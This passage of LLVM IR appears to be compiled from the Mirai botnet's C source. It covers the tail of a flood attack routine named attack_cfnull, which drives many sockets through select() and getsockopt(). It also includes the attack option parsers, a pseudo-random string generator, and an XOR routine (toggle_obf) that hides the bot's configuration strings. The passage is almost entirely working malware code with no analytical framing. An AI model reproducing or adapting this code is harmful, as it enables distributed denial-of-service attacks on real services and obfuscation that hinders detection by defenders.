  %646 = getelementptr inbounds [1025 x i8], [1025 x i8]* %32, i64 0, i64 0
  %647 = call i32 @util_strlen(i8* noundef %646)
  %648 = icmp ne i32 %645, %647
  br i1 %648, label %649, label %652

649:                                              ; preds = %644
  %650 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %651 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %650, i32 0, i32 1
  store i8 9, i8* %651, align 4
  br label %652

652:                                              ; preds = %649, %644
  %653 = load i32, i32* %31, align 4
  %654 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %655 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %654, i32 0, i32 7
  %656 = load i32, i32* %655, align 4
  %657 = sub nsw i32 %656, %653
  store i32 %657, i32* %655, align 4
  %658 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %659 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %658, i32 0, i32 0
  %660 = load i32, i32* %659, align 4
  %661 = srem i32 %660, 64
  %662 = zext i32 %661 to i64
  %663 = shl i64 1, %662
  %664 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %665 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %666 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %665, i32 0, i32 0
  %667 = load i32, i32* %666, align 4
  %668 = sdiv i32 %667, 64
  %669 = sext i32 %668 to i64
  %670 = getelementptr inbounds [16 x i64], [16 x i64]* %664, i64 0, i64 %669
  %671 = load i64, i64* %670, align 8
  %672 = or i64 %671, %663
  store i64 %672, i64* %670, align 8
  br label %673

673:                                              ; preds = %652, %586
  %674 = load i32, i32* %23, align 4
  %675 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %676 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %675, i32 0, i32 3
  store i32 %674, i32* %676, align 4
  %677 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %678 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %677, i32 0, i32 0
  %679 = load i32, i32* %678, align 4
  %680 = srem i32 %679, 64
  %681 = zext i32 %680 to i64
  %682 = shl i64 1, %681
  %683 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %684 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %685 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %684, i32 0, i32 0
  %686 = load i32, i32* %685, align 4
  %687 = sdiv i32 %686, 64
  %688 = sext i32 %687 to i64
  %689 = getelementptr inbounds [16 x i64], [16 x i64]* %683, i64 0, i64 %688
  %690 = load i64, i64* %689, align 8
  %691 = or i64 %690, %682
  store i64 %691, i64* %689, align 8
  %692 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %693 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %692, i32 0, i32 0
  %694 = load i32, i32* %693, align 4
  %695 = load i32, i32* %19, align 4
  %696 = icmp sgt i32 %694, %695
  br i1 %696, label %697, label %702

697:                                              ; preds = %673
  %698 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %699 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %698, i32 0, i32 0
  %700 = load i32, i32* %699, align 4
  %701 = add nsw i32 %700, 1
  store i32 %701, i32* %19, align 4
  br label %702

702:                                              ; preds = %697, %673
  br label %746

703:                                              ; preds = %572
  %704 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %705 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %704, i32 0, i32 1
  %706 = load i8, i8* %705, align 4
  %707 = zext i8 %706 to i32
  %708 = icmp eq i32 %707, 9
  br i1 %708, label %709, label %736

709:                                              ; preds = %703
  %710 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %711 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %710, i32 0, i32 0
  %712 = load i32, i32* %711, align 4
  %713 = srem i32 %712, 64
  %714 = zext i32 %713 to i64
  %715 = shl i64 1, %714
  %716 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %717 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %718 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %717, i32 0, i32 0
  %719 = load i32, i32* %718, align 4
  %720 = sdiv i32 %719, 64
  %721 = sext i32 %720 to i64
  %722 = getelementptr inbounds [16 x i64], [16 x i64]* %716, i64 0, i64 %721
  %723 = load i64, i64* %722, align 8
  %724 = or i64 %723, %715
  store i64 %724, i64* %722, align 8
  %725 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %726 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %725, i32 0, i32 0
  %727 = load i32, i32* %726, align 4
  %728 = load i32, i32* %19, align 4
  %729 = icmp sgt i32 %727, %728
  br i1 %729, label %730, label %735

730:                                              ; preds = %709
  %731 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %732 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %731, i32 0, i32 0
  %733 = load i32, i32* %732, align 4
  %734 = add nsw i32 %733, 1
  store i32 %734, i32* %19, align 4
  br label %735

735:                                              ; preds = %730, %709
  br label %745

736:                                              ; preds = %703
  %737 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %738 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %737, i32 0, i32 1
  store i8 0, i8* %738, align 4
  %739 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %740 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %739, i32 0, i32 0
  %741 = load i32, i32* %740, align 4
  %742 = call i32 @close(i32 noundef %741)
  %743 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %744 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %743, i32 0, i32 0
  store i32 -1, i32* %744, align 4
  br label %745

745:                                              ; preds = %736, %735
  br label %746

746:                                              ; preds = %745, %702
  br label %747

747:                                              ; preds = %746, %571
  br label %748

748:                                              ; preds = %747, %376
  br label %749

749:                                              ; preds = %748, %327
  br label %750

750:                                              ; preds = %749, %641, %341, %265
  %751 = load i32, i32* %9, align 4
  %752 = add nsw i32 %751, 1
  store i32 %752, i32* %9, align 4
  br label %226, !llvm.loop !24

753:                                              ; preds = %226
  %754 = load i32, i32* %19, align 4
  %755 = icmp eq i32 %754, 0
  br i1 %755, label %756, label %757

756:                                              ; preds = %753
  br label %191

757:                                              ; preds = %753
  %758 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 1
  store i64 0, i64* %758, align 8
  %759 = getelementptr inbounds %struct.timeval, %struct.timeval* %21, i32 0, i32 0
  store i64 1, i64* %759, align 8
  %760 = load i32, i32* %19, align 4
  %761 = call i32 @select(i32 noundef %760, %struct.fd_set* noundef %17, %struct.fd_set* noundef %18, %struct.fd_set* noundef null, %struct.timeval* noundef %21)
  store i32 %761, i32* %20, align 4
  %762 = call i64 @time(i64* noundef null) #6
  %763 = trunc i64 %762 to i32
  store i32 %763, i32* %23, align 4
  %764 = load i32, i32* %20, align 4
  %765 = icmp slt i32 %764, 1
  br i1 %765, label %766, label %767

766:                                              ; preds = %757
  br label %191

767:                                              ; preds = %757
  store i32 0, i32* %9, align 4
  br label %768

768:                                              ; preds = %861, %767
  %769 = load i32, i32* %9, align 4
  %770 = load i32, i32* %15, align 4
  %771 = icmp slt i32 %769, %770
  br i1 %771, label %772, label %864

772:                                              ; preds = %768
  %773 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %13, align 8
  %774 = load i32, i32* %9, align 4
  %775 = sext i32 %774 to i64
  %776 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %773, i64 %775
  store %struct.attack_cfnull_state* %776, %struct.attack_cfnull_state** %22, align 8
  %777 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %778 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %777, i32 0, i32 0
  %779 = load i32, i32* %778, align 4
  %780 = icmp eq i32 %779, -1
  br i1 %780, label %781, label %782

781:                                              ; preds = %772
  br label %861

782:                                              ; preds = %772
  %783 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %18, i32 0, i32 0
  %784 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %785 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %784, i32 0, i32 0
  %786 = load i32, i32* %785, align 4
  %787 = sdiv i32 %786, 64
  %788 = sext i32 %787 to i64
  %789 = getelementptr inbounds [16 x i64], [16 x i64]* %783, i64 0, i64 %788
  %790 = load i64, i64* %789, align 8
  %791 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %792 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %791, i32 0, i32 0
  %793 = load i32, i32* %792, align 4
  %794 = srem i32 %793, 64
  %795 = zext i32 %794 to i64
  %796 = shl i64 1, %795
  %797 = and i64 %790, %796
  %798 = icmp ne i64 %797, 0
  br i1 %798, label %799, label %840

799:                                              ; preds = %782
  %800 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %801 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %800, i32 0, i32 1
  %802 = load i8, i8* %801, align 4
  %803 = zext i8 %802 to i32
  %804 = icmp eq i32 %803, 2
  br i1 %804, label %805, label %829

805:                                              ; preds = %799
  store i32 0, i32* %34, align 4
  store i32 4, i32* %35, align 4
  %806 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %807 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %806, i32 0, i32 0
  %808 = load i32, i32* %807, align 4
  %809 = bitcast i32* %34 to i8*
  %810 = call i32 @getsockopt(i32 noundef %808, i32 noundef 1, i32 noundef 4, i8* noundef %809, i32* noundef %35) #6
  store i32 %810, i32* %12, align 4
  %811 = load i32, i32* %34, align 4
  %812 = icmp eq i32 %811, 0
  br i1 %812, label %813, label %819

813:                                              ; preds = %805
  %814 = load i32, i32* %12, align 4
  %815 = icmp eq i32 %814, 0
  br i1 %815, label %816, label %819

816:                                              ; preds = %813
  %817 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %818 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %817, i32 0, i32 1
  store i8 4, i8* %818, align 4
  br label %828

819:                                              ; preds = %813, %805
  %820 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %821 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %820, i32 0, i32 0
  %822 = load i32, i32* %821, align 4
  %823 = call i32 @close(i32 noundef %822)
  %824 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %825 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %824, i32 0, i32 0
  store i32 -1, i32* %825, align 4
  %826 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %827 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %826, i32 0, i32 1
  store i8 0, i8* %827, align 4
  br label %861

828:                                              ; preds = %816
  br label %839

829:                                              ; preds = %799
  %830 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %831 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %830, i32 0, i32 1
  %832 = load i8, i8* %831, align 4
  %833 = zext i8 %832 to i32
  %834 = icmp eq i32 %833, 9
  br i1 %834, label %835, label %838

835:                                              ; preds = %829
  %836 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %837 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %836, i32 0, i32 1
  store i8 8, i8* %837, align 4
  br label %838

838:                                              ; preds = %835, %829
  br label %839

839:                                              ; preds = %838, %828
  br label %840

840:                                              ; preds = %839, %782
  %841 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %17, i32 0, i32 0
  %842 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %843 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %842, i32 0, i32 0
  %844 = load i32, i32* %843, align 4
  %845 = sdiv i32 %844, 64
  %846 = sext i32 %845 to i64
  %847 = getelementptr inbounds [16 x i64], [16 x i64]* %841, i64 0, i64 %846
  %848 = load i64, i64* %847, align 8
  %849 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %850 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %849, i32 0, i32 0
  %851 = load i32, i32* %850, align 4
  %852 = srem i32 %851, 64
  %853 = zext i32 %852 to i64
  %854 = shl i64 1, %853
  %855 = and i64 %848, %854
  %856 = icmp ne i64 %855, 0
  br i1 %856, label %857, label %860

857:                                              ; preds = %840
  %858 = load %struct.attack_cfnull_state*, %struct.attack_cfnull_state** %22, align 8
  %859 = getelementptr inbounds %struct.attack_cfnull_state, %struct.attack_cfnull_state* %858, i32 0, i32 1
  store i8 1, i8* %859, align 4
  br label %860

860:                                              ; preds = %857, %840
  br label %861

861:                                              ; preds = %860, %819, %781
  %862 = load i32, i32* %9, align 4
  %863 = add nsw i32 %862, 1
  store i32 %863, i32* %9, align 4
  br label %768, !llvm.loop !25

864:                                              ; preds = %768
  br label %191

865:                                              ; preds = %50, %45
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @attack_get_opt_str(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i8* noundef %3) #0 {
  %5 = alloca i8*, align 8
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i8* %3, i8** %9, align 8
  store i32 0, i32* %10, align 4
  store i32 0, i32* %10, align 4
  br label %11

11:                                               ; preds = %35, %4
  %12 = load i32, i32* %10, align 4
  %13 = load i8, i8* %6, align 1
  %14 = zext i8 %13 to i32
  %15 = icmp slt i32 %12, %14
  br i1 %15, label %16, label %38

16:                                               ; preds = %11
  %17 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %18 = load i32, i32* %10, align 4
  %19 = sext i32 %18 to i64
  %20 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %17, i64 %19
  %21 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %20, i32 0, i32 1
  %22 = load i8, i8* %21, align 8
  %23 = zext i8 %22 to i32
  %24 = load i8, i8* %8, align 1
  %25 = zext i8 %24 to i32
  %26 = icmp eq i32 %23, %25
  br i1 %26, label %27, label %34

27:                                               ; preds = %16
  %28 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %29 = load i32, i32* %10, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %28, i64 %30
  %32 = getelementptr inbounds %struct.attack_option, %struct.attack_option* %31, i32 0, i32 0
  %33 = load i8*, i8** %32, align 8
  store i8* %33, i8** %5, align 8
  br label %40

34:                                               ; preds = %16
  br label %35

35:                                               ; preds = %34
  %36 = load i32, i32* %10, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %10, align 4
  br label %11, !llvm.loop !26

38:                                               ; preds = %11
  %39 = load i8*, i8** %9, align 8
  store i8* %39, i8** %5, align 8
  br label %40

40:                                               ; preds = %38, %27
  %41 = load i8*, i8** %5, align 8
  ret i8* %41
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @attack_get_opt_int(i8 noundef zeroext %0, %struct.attack_option* noundef %1, i8 noundef zeroext %2, i32 noundef %3) #0 {
  %5 = alloca i32, align 4
  %6 = alloca i8, align 1
  %7 = alloca %struct.attack_option*, align 8
  %8 = alloca i8, align 1
  %9 = alloca i32, align 4
  %10 = alloca i8*, align 8
  store i8 %0, i8* %6, align 1
  store %struct.attack_option* %1, %struct.attack_option** %7, align 8
  store i8 %2, i8* %8, align 1
  store i32 %3, i32* %9, align 4
  %11 = load i8, i8* %6, align 1
  %12 = load %struct.attack_option*, %struct.attack_option** %7, align 8
  %13 = load i8, i8* %8, align 1
  %14 = call i8* @attack_get_opt_str(i8 noundef zeroext %11, %struct.attack_option* noundef %12, i8 noundef zeroext %13, i8* noundef null)
  store i8* %14, i8** %10, align 8
  %15 = load i8*, i8** %10, align 8
  %16 = icmp eq i8* %15, null
  br i1 %16, label %17, label %19

17:                                               ; preds = %4
  %18 = load i32, i32* %9, align 4
  store i32 %18, i32* %5, align 4
  br label %22

19:                                               ; preds = %4
  %20 = load i8*, i8** %10, align 8
  %21 = call i32 @util_atoi(i8* noundef %20, i32 noundef 10)
  store i32 %21, i32* %5, align 4
  br label %22

22:                                               ; preds = %19, %17
  %23 = load i32, i32* %5, align 4
  ret i32 %23
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @rand_next() #0 {
  %1 = alloca i32, align 4
  %2 = load i32, i32* @x, align 4
  store i32 %2, i32* %1, align 4
  %3 = load i32, i32* %1, align 4
  %4 = shl i32 %3, 11
  %5 = load i32, i32* %1, align 4
  %6 = xor i32 %5, %4
  store i32 %6, i32* %1, align 4
  %7 = load i32, i32* %1, align 4
  %8 = lshr i32 %7, 8
  %9 = load i32, i32* %1, align 4
  %10 = xor i32 %9, %8
  store i32 %10, i32* %1, align 4
  %11 = load i32, i32* @y, align 4
  store i32 %11, i32* @x, align 4
  %12 = load i32, i32* @z, align 4
  store i32 %12, i32* @y, align 4
  %13 = load i32, i32* @w, align 4
  store i32 %13, i32* @z, align 4
  %14 = load i32, i32* @w, align 4
  %15 = lshr i32 %14, 19
  %16 = load i32, i32* @w, align 4
  %17 = xor i32 %16, %15
  store i32 %17, i32* @w, align 4
  %18 = load i32, i32* %1, align 4
  %19 = load i32, i32* @w, align 4
  %20 = xor i32 %19, %18
  store i32 %20, i32* @w, align 4
  %21 = load i32, i32* @w, align 4
  ret i32 %21
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @rand_alphastr(i8* noundef %0, i32 noundef %1) #0 {
  %3 = alloca i8*, align 8
  %4 = alloca i32, align 4
  %5 = alloca [32 x i8], align 16
  store i8* %0, i8** %3, align 8
  store i32 %1, i32* %4, align 4
  call void @table_unlock_val(i8 noundef zeroext 61)
  %6 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 0
  %7 = call i8* @table_retrieve_val(i32 noundef 61, i32* noundef null)
  %8 = call i8* @strcpy(i8* noundef %6, i8* noundef %7) #6
  br label %9

9:                                                ; preds = %13, %2
  %10 = load i32, i32* %4, align 4
  %11 = add nsw i32 %10, -1
  store i32 %11, i32* %4, align 4
  %12 = icmp ne i32 %10, 0
  br i1 %12, label %13, label %23

13:                                               ; preds = %9
  %14 = call i32 @rand_next()
  %15 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 0
  %16 = call i32 @util_strlen(i8* noundef %15)
  %17 = urem i32 %14, %16
  %18 = zext i32 %17 to i64
  %19 = getelementptr inbounds [32 x i8], [32 x i8]* %5, i64 0, i64 %18
  %20 = load i8, i8* %19, align 1
  %21 = load i8*, i8** %3, align 8
  %22 = getelementptr inbounds i8, i8* %21, i32 1
  store i8* %22, i8** %3, align 8
  store i8 %20, i8* %21, align 1
  br label %9, !llvm.loop !27

23:                                               ; preds = %9
  call void @table_lock_val(i8 noundef zeroext 61)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_unlock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define internal void @toggle_obf(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca i32, align 4
  %4 = alloca %struct.table_value*, align 8
  %5 = alloca i8, align 1
  %6 = alloca i8, align 1
  %7 = alloca i8, align 1
  %8 = alloca i8, align 1
  store i8 %0, i8* %2, align 1
  %9 = load i8, i8* %2, align 1
  %10 = zext i8 %9 to i64
  %11 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %10
  store %struct.table_value* %11, %struct.table_value** %4, align 8
  %12 = load i32, i32* @table_key, align 4
  %13 = and i32 %12, 255
  %14 = trunc i32 %13 to i8
  store i8 %14, i8* %5, align 1
  %15 = load i32, i32* @table_key, align 4
  %16 = lshr i32 %15, 8
  %17 = and i32 %16, 255
  %18 = trunc i32 %17 to i8
  store i8 %18, i8* %6, align 1
  %19 = load i32, i32* @table_key, align 4
  %20 = lshr i32 %19, 16
  %21 = and i32 %20, 255
  %22 = trunc i32 %21 to i8
  store i8 %22, i8* %7, align 1
  %23 = load i32, i32* @table_key, align 4
  %24 = lshr i32 %23, 24
  %25 = and i32 %24, 255
  %26 = trunc i32 %25 to i8
  store i8 %26, i8* %8, align 1
  store i32 0, i32* %3, align 4
  br label %27

27:                                               ; preds = %83, %1
  %28 = load i32, i32* %3, align 4
  %29 = load %struct.table_value*, %struct.table_value** %4, align 8
  %30 = getelementptr inbounds %struct.table_value, %struct.table_value* %29, i32 0, i32 1
  %31 = load i16, i16* %30, align 8
  %32 = zext i16 %31 to i32
  %33 = icmp slt i32 %28, %32
  br i1 %33, label %34, label %86

34:                                               ; preds = %27
  %35 = load i8, i8* %5, align 1
  %36 = zext i8 %35 to i32
  %37 = load %struct.table_value*, %struct.table_value** %4, align 8
  %38 = getelementptr inbounds %struct.table_value, %struct.table_value* %37, i32 0, i32 0
  %39 = load i8*, i8** %38, align 8
  %40 = load i32, i32* %3, align 4
  %41 = sext i32 %40 to i64
  %42 = getelementptr inbounds i8, i8* %39, i64 %41
  %43 = load i8, i8* %42, align 1
  %44 = sext i8 %43 to i32
  %45 = xor i32 %44, %36
  %46 = trunc i32 %45 to i8
  store i8 %46, i8* %42, align 1
  %47 = load i8, i8* %6, align 1
  %48 = zext i8 %47 to i32
  %49 = load %struct.table_value*, %struct.table_value** %4, align 8
  %50 = getelementptr inbounds %struct.table_value, %struct.table_value* %49, i32 0, i32 0
  %51 = load i8*, i8** %50, align 8
  %52 = load i32, i32* %3, align 4
  %53 = sext i32 %52 to i64
  %54 = getelementptr inbounds i8, i8* %51, i64 %53
  %55 = load i8, i8* %54, align 1
  %56 = sext i8 %55 to i32
  %57 = xor i32 %56, %48
  %58 = trunc i32 %57 to i8
  store i8 %58, i8* %54, align 1
  %59 = load i8, i8* %7, align 1
  %60 = zext i8 %59 to i32
  %61 = load %struct.table_value*, %struct.table_value** %4, align 8
  %62 = getelementptr inbounds %struct.table_value, %struct.table_value* %61, i32 0, i32 0
  %63 = load i8*, i8** %62, align 8
  %64 = load i32, i32* %3, align 4
  %65 = sext i32 %64 to i64
  %66 = getelementptr inbounds i8, i8* %63, i64 %65
  %67 = load i8, i8* %66, align 1
  %68 = sext i8 %67 to i32
  %69 = xor i32 %68, %60
  %70 = trunc i32 %69 to i8
  store i8 %70, i8* %66, align 1
  %71 = load i8, i8* %8, align 1
  %72 = zext i8 %71 to i32
  %73 = load %struct.table_value*, %struct.table_value** %4, align 8
  %74 = getelementptr inbounds %struct.table_value, %struct.table_value* %73, i32 0, i32 0
  %75 = load i8*, i8** %74, align 8
  %76 = load i32, i32* %3, align 4
  %77 = sext i32 %76 to i64
  %78 = getelementptr inbounds i8, i8* %75, i64 %77
  %79 = load i8, i8* %78, align 1
  %80 = sext i8 %79 to i32
  %81 = xor i32 %80, %72
  %82 = trunc i32 %81 to i8
  store i8 %82, i8* %78, align 1
  br label %83

83:                                               ; preds = %34
  %84 = load i32, i32* %3, align 4
  %85 = add nsw i32 %84, 1
  store i32 %85, i32* %3, align 4
  br label %27, !llvm.loop !28

86:                                               ; preds = %27
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local void @table_lock_val(i8 noundef zeroext %0) #0 {
  %2 = alloca i8, align 1
  %3 = alloca %struct.table_value*, align 8
  store i8 %0, i8* %2, align 1
  %4 = load i8, i8* %2, align 1
  %5 = zext i8 %4 to i64
  %6 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %5
  store %struct.table_value* %6, %struct.table_value** %3, align 8
  %7 = load i8, i8* %2, align 1
  call void @toggle_obf(i8 noundef zeroext %7)
  ret void
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i8* @table_retrieve_val(i32 noundef %0, i32* noundef %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32*, align 8
  %5 = alloca %struct.table_value*, align 8
  store i32 %0, i32* %3, align 4
  store i32* %1, i32** %4, align 8
  %6 = load i32, i32* %3, align 4
  %7 = sext i32 %6 to i64
  %8 = getelementptr inbounds [63 x %struct.table_value], [63 x %struct.table_value]* @table, i64 0, i64 %7
  store %struct.table_value* %8, %struct.table_value** %5, align 8
  %9 = load i32*, i32** %4, align 8
  %10 = icmp ne i32* %9, null
  br i1 %10, label %11, label %17

11:                                               ; preds = %2
  %12 = load %struct.table_value*, %struct.table_value** %5, align 8
  %13 = getelementptr inbounds %struct.table_value, %struct.table_value* %12, i32 0, i32 1
  %14 = load i16, i16* %13, align 8
  %15 = zext i16 %14 to i32
  %16 = load i32*, i32** %4, align 8
  store i32 %15, i32* %16, align 4
  br label %17

17:                                               ; preds = %11, %2
  %18 = load %struct.table_value*, %struct.table_value** %5, align 8
  %19 = getelementptr inbounds %struct.table_value, %struct.table_value* %18, i32 0, i32 0
  %20 = load i8*, i8** %19, align 8
  ret i8* %20
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local i32 @util_strlen(i8* noundef %0) #0 {
  %2 = alloca i8*, align 8
  %3 = alloca i32, align 4
  store i8* %0, i8** %2, align 8
  store i32 0, i32* %3, align 4
  br label %4

4:                                                ; preds = %10, %1
  %5 = load i8*, i8** %2, align 8
  %6 = getelementptr inbounds i8, i8* %5, i32 1
  store i8* %6, i8** %2, align 8
  %7 = load i8, i8* %5, align 1
  %8 = sext i8 %7 to i32
  %9 = icmp ne i32 %8, 0
  br i1 %9, label %10, label %13

10:                                               ; preds = %4
  %11 = load i32, i32* %3, align 4
  %12 = add nsw i32 %11, 1
  store i32 %12, i32* %3, align 4
  br label %4, !llvm.loop !29

13:                                               ; preds = %4
  %14 = load i32, i32* %3, align 4
  ret i32 %14
}

; Function Attrs: noinline nounwind sspstrong uwtable
define dso_local signext i8 @util_strncmp(i8* noundef %0, i8* noundef %1, i32 noundef %2) #0 {
  %4 = alloca i8, align 1
  %5 = alloca i8*, align 8
  %6 = alloca i8*, align 8
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  store i8* %0, i8** %5, align 8
  store i8* %1, i8** %6, align 8
  store i32 %2, i32* %7, align 4
  %10 = load i8*, i8** %5, align 8
  %11 = call i32 @util_strlen(i8* noundef %10)
  store i32 %11, i32* %8, align 4
  %12 = load i8*, i8** %6, align 8
  %13 = call i32 @util_strlen(i8* noundef %12)
  store i32 %13, i32* %9, align 4
  %14 = load i32, i32* %8, align 4
  %15 = load i32, i32* %7, align 4
  %16 = icmp slt i32 %14, %15
  br i1 %16, label %21, label %17

17:                                               ; preds = %3
  %18 = load i32, i32* %9, align 4
  %19 = load i32, i32* %7, align 4
  %20 = icmp slt i32 %18, %19
  br i1 %20, label %21, label %22

21:                                               ; preds = %17, %3
  store i8 0, i8* %4, align 1
  br label %40

22:                                               ; preds = %17
  br label %23

23:                                               ; preds = %38, %22
  %24 = load i32, i32* %7, align 4
  %25 = add nsw i32 %24, -1
  store i32 %25, i32* %7, align 4
  %26 = icmp ne i32 %24, 0
  br i1 %26, label %27, label %39

27:                                               ; preds = %23
  %28 = load i8*, i8** %5, align 8
  %29 = getelementptr inbounds i8, i8* %28, i32 1
  store i8* %29, i8** %5, align 8
  %30 = load i8, i8* %28, align 1
  %31 = sext i8 %30 to i32
  %32 = load i8*, i8** %6, align 8
  %33 = getelementptr inbounds i8, i8* %32, i32 1
  store i8* %33, i8** %6, align 8
  %34 = load i8, i8* %32, align 1
  %35 = sext i8 %34 to i32
  %36 = icmp ne i32 %31, %35
  br i1 %36, label %37, label %38

37:                                               ; preds = %27
  store i8 0, i8* %4, align 1
  br label %40

38:                                               ; preds = %27
  br label %23, !llvm.loop !30

39:                                               ; preds = %23
  store i8 1, i8* %4, align 1
  br label %40

40:                                               ; preds = %39, %37, %21
  %41 = load i8, i8* %4, align 1
  ret i8 %41
}

